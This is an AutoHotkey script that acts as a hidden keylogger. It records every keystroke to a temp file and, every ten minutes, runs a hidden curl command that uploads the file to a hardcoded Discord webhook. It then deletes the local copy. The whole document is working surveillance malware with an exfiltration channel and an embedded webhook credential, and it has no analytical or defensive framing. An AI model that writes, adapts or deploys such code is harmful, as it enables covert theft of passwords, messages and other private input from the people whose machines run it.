Webhook := "https://discord.com/api/webhooks/1566794060101066863/NTgbNGqUhX_yMFNA_ls1g6rjDw9pIgnUIo5GrreKCjDzhQe4mYCXB6kNq31aml836NUX"
SendWebhook(Message)
{
global Webhook
Json := "{""content"":""" Message """}"
Http := ComObjCreate("WinHttp.WinHttpRequest.5.1")
Http.Open("POST", Webhook, False)
Http.SetRequestHeader("Content-Type", "application/json")
Http.Send(Json)
}

SetTimer, SendW, 600000
SendWebhook("Successfully connected to webhook :white_check_mark:")
Loop {
	Input, Key, L1 V
	FileAppend, %Key%, %A_Temp%emp.txt
}

SendW:
RunWait % ComSpec . " /c curl -F ""file1=@" . A_Temp . "emp.txt"" """ . Webhook . """",, Hide
FileDelete, %A_Temp%emp.txt
return
